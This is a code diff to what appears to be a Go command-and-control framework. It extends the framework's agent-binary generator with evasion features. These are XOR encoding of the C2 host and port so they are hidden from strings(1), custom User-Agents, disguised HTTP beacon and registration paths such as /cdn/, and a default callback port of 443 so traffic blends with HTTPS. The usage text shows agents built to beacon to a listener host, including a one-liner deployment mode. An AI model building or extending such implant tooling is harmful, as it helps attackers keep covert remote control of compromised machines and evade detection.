@@ -20,6 +20,8 @@ package main
 
 import (
 	"bytes"
+	"crypto/rand"
+	"encoding/hex"
 	"fmt"
 	"os"
 	"os/exec"
@@ -72,14 +74,18 @@ func lookupTarget(goos, goarch string) *generateTarget {
 // ── Options ───────────────────────────────────────────────────────────────────
 
 type generateOpts struct {
-	target    *generateTarget
-	lhost     string
-	lport     string
-	transport string
-	interval  string
-	jitter    string
-	out       string
-	noPin     bool
+	target           *generateTarget
+	lhost            string
+	lport            string
+	transport        string
+	interval         string
+	jitter           string
+	out              string
+	noPin            bool
+	obfuscate        bool
+	httpUA           string
+	httpRegisterPath string
+	httpBeaconPath   string
 }
 
 // defaultOut returns the default output filename for this build.
@@ -164,7 +170,27 @@ func (c *Console) cmdGenerateBuild(args []string) {
 	} else {
 		fmt.Println("[!] No server fingerprint available — agent built without pinning")
 	}
-
+	if opts.obfuscate {
+		fmt.Println("[*] Obfuscation: enabled (XOR, 16-byte random key)")
+	}
+	if opts.transport == "http" {
+		rp := opts.httpRegisterPath
+		if rp == "" {
+			rp = "/register"
+		}
+		bp := opts.httpBeaconPath
+		if bp == "" {
+			bp = "/beacon/"
+		}
+		fmt.Printf("[*] HTTP paths: register=%s beacon=%s\n", rp, bp)
+		if opts.httpUA != "" {
+			fmt.Printf("[*] User-Agent: %s\n", opts.httpUA)
+		}
+		if rp != "/register" || bp != "/beacon/" {
+			fmt.Printf("[!] Start listener: listen http :%s --register %s --beacon %s\n",
+				opts.lport, rp, bp)
+		}
+	}
 	printDeployHint(opts.out, opts.target)
 }
 
@@ -219,7 +245,7 @@ func parseGenerateArgs(args []string, c *Console) (generateOpts, bool) {
 
 	opts := generateOpts{
 		target:    target,
-		lport:     "4444",
+		lport:     "443",
 		transport: "tcp",
 		interval:  "60",
 		jitter:    "20",
@@ -276,6 +302,29 @@ func parseGenerateArgs(args []string, c *Console) (generateOpts, bool) {
 			opts.out = rest[i]
 		case "--no-pin":
 			opts.noPin = true
+		case "--obfuscate":
+			opts.obfuscate = true
+		case "--http-ua":
+			if i+1 >= len(rest) {
+				fmt.Println("[!] --http-ua requires a value")
+				return generateOpts{}, false
+			}
+			i++
+			opts.httpUA = rest[i]
+		case "--http-register-path":
+			if i+1 >= len(rest) {
+				fmt.Println("[!] --http-register-path requires a value")
+				return generateOpts{}, false
+			}
+			i++
+			opts.httpRegisterPath = rest[i]
+		case "--http-beacon-path":
+			if i+1 >= len(rest) {
+				fmt.Println("[!] --http-beacon-path requires a value")
+				return generateOpts{}, false
+			}
+			i++
+			opts.httpBeaconPath = rest[i]
 		default:
 			fmt.Printf("[!] Unknown flag: %s\n", rest[i])
 			printGenerateUsage()
@@ -288,27 +337,89 @@ func parseGenerateArgs(args []string, c *Console) (generateOpts, bool) {
 		printGenerateUsage()
 		return generateOpts{}, false
 	}
-	// Default HTTP port when transport=http and port was not explicitly set.
-	if opts.transport == "http" && opts.lport == "4444" {
-		opts.lport = "8080"
-	}
-
 	return opts, true
 }
 
 // buildGenerateLDFlags constructs the -ldflags string for the agent binary.
+// When opts.obfuscate is set, sensitive config strings are XOR-encoded with a
+// random per-build key; the plain vars are cleared so only enc variants work.
 func buildGenerateLDFlags(opts generateOpts, c *Console) string {
-	flags := []string{
-		fmt.Sprintf("-X main.lhost=%s", opts.lhost),
-		fmt.Sprintf("-X main.lport=%s", opts.lport),
-		fmt.Sprintf("-X main.transport=%s", opts.transport),
-		fmt.Sprintf("-X main.interval=%s", opts.interval),
-		fmt.Sprintf("-X main.jitter=%s", opts.jitter),
+	fp := ""
+	if !opts.noPin {
+		fp = c.opts.serverFingerprint
 	}
-	if !opts.noPin && c.opts.serverFingerprint != "" {
-		flags = append(flags, fmt.Sprintf("-X main.serverFingerprint=%s", c.opts.serverFingerprint))
+
+	var flags []string
+
+	// HTTP customisation flags (always plain — not security-sensitive).
+	if opts.httpUA != "" {
+		flags = append(flags, fmt.Sprintf("-X 'main.httpUA=%s'", opts.httpUA))
 	}
+	if opts.httpRegisterPath != "" {
+		flags = append(flags, fmt.Sprintf("-X main.httpRegisterPath=%s", opts.httpRegisterPath))
+	}
+	if opts.httpBeaconPath != "" {
+		flags = append(flags, fmt.Sprintf("-X main.httpBeaconPath=%s", opts.httpBeaconPath))
+	}
+
+	if opts.obfuscate {
+		key := xorGenKey(16) // 16 random bytes
+		keyHex := hex.EncodeToString(key)
+		flags = append(flags,
+			fmt.Sprintf("-X main.xorKey=%s", keyHex),
+			// Encoded sensitive values.
+			fmt.Sprintf("-X main.lhostEnc=%s", xorEncodeStr(opts.lhost, key)),
+			fmt.Sprintf("-X main.lportEnc=%s", xorEncodeStr(opts.lport, key)),
+			fmt.Sprintf("-X main.transportEnc=%s", xorEncodeStr(opts.transport, key)),
+			fmt.Sprintf("-X main.intervalEnc=%s", xorEncodeStr(opts.interval, key)),
+			fmt.Sprintf("-X main.jitterEnc=%s", xorEncodeStr(opts.jitter, key)),
+			// Clear plain vars so they don't appear in strings output.
+			"-X main.lhost=",
+			"-X main.lport=",
+			"-X main.transport=",
+			"-X main.interval=",
+			"-X main.jitter=",
+		)
+		if fp != "" {
+			flags = append(flags,
+				fmt.Sprintf("-X main.serverFingerprintEnc=%s", xorEncodeStr(fp, key)),
+				"-X main.serverFingerprint=",
+			)
+		}
+	} else {
+		flags = append(flags,
+			fmt.Sprintf("-X main.lhost=%s", opts.lhost),
+			fmt.Sprintf("-X main.lport=%s", opts.lport),
+			fmt.Sprintf("-X main.transport=%s", opts.transport),
+			fmt.Sprintf("-X main.interval=%s", opts.interval),
+			fmt.Sprintf("-X main.jitter=%s", opts.jitter),
+		)
+		if fp != "" {
+			flags = append(flags, fmt.Sprintf("-X main.serverFingerprint=%s", fp))
+		}
+	}
+
 	return strings.Join(flags, " ")
+}
+
+// ── XOR helpers (server-side only) ───────────────────────────────────────────
+
+// xorGenKey generates n cryptographically random bytes for use as a XOR key.
+func xorGenKey(n int) []byte {
+	key := make([]byte, n)
+	if _, err := rand.Read(key); err != nil {
+		panic("rand.Read: " + err.Error())
+	}
+	return key
+}
+
+// xorEncodeStr XOR-encodes s with key and returns the result as a lowercase hex string.
+func xorEncodeStr(s string, key []byte) string {
+	b := []byte(s)
+	for i := range b {
+		b[i] ^= key[i%len(key)]
+	}
+	return hex.EncodeToString(b)
 }
 
 // buildAgentBinary runs go build for the agent with the given options.
@@ -411,18 +522,24 @@ func printGenerateUsage() {
   generate oneliner <os> <arch> --lhost <host> [options]
 
 Options:
-  --lhost <host>      C2 listener IP or hostname (required)
-  --lport <port>      listener port (default: 4444 tcp / 8080 http)
-  --transport <t>     tcp or http (default: tcp)
+  --lhost <host>             C2 listener IP or hostname (required)
+  --lport <port>             listener port (default: 443)
+  --transport <t>            tcp or http (default: tcp)
   --interval <s>      beacon interval in seconds (default: 60)
   --jitter <pct>      jitter percentage 0–50 (default: 20)
   --out <file>        output filename (default: agent-<target>[-http][.exe])
-  --no-pin            omit certificate pinning (dev / CTF testing only)
+  --no-pin                   omit certificate pinning (dev/CTF testing only)
+  --obfuscate                XOR-encode config strings (hides C2 IP from strings(1))
+  --http-ua <ua>             custom User-Agent header for HTTP transport
+  --http-register-path <p>   server registration URI (default: /register)
+  --http-beacon-path <p>     server beacon URI prefix (default: /beacon/)
 
 Examples:
   generate linux amd64 --lhost 10.0.0.1
-  generate linux amd64 --lhost 10.0.0.1 --lport 8080 --transport http
-  generate windows amd64 --lhost 10.0.0.1 --out beacon.exe
+  generate linux amd64 --lhost 10.0.0.1 --transport http --obfuscate
+  generate linux amd64 --lhost 10.0.0.1 --transport http \
+    --http-register-path /api/v1/status --http-beacon-path /cdn/
+  generate windows amd64 --lhost 10.0.0.1 --out beacon.exe --obfuscate
   generate oneliner linux amd64 --lhost 10.0.0.1
 `)
 }
